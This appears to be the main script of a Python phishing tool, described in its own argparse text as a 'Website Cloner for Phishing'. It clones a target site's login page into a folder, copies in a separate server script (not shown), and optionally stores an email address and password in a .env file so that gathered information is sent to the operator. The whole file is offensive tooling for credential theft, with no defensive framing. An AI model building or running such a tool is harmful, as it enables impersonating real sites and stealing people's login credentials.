import argparse
from src.cloner import Cloner
from shutil import copyfile

parser = argparse.ArgumentParser(description='Website Cloner for Phishing')
parser.add_argument('site', type=str, help="website's login-page URL to clone")
parser.add_argument('--folder', '-f', default="website", help='folder to store cloned site content')
parser.add_argument('--email', '-e', default=None, required=False, help="email address to store gathered info, requires password field")
parser.add_argument('--password', '-p', default=None, required=False, help="password for Email address, requires email field")

args = parser.parse_args()

if bool(args.email) ^ bool(args.password):
    temp = "email" if args.email else "password"
    print(f"Both email and password are required for email functionality, not just {temp}")


cloner = Cloner(args.site,args.folder)
cloner.clone()
print(f"cloned {args.site} to ./{args.folder}")

copyfile("./src/server.py","./"+args.folder+"/server.py")

if(args.email and args.password):
    with open(f"./{args.folder}/.env", "w") as file:
        file.write(f"EMAIL={args.email}\nPASSWORD={args.password}")
        print(f"created ./{args.folder}/.env")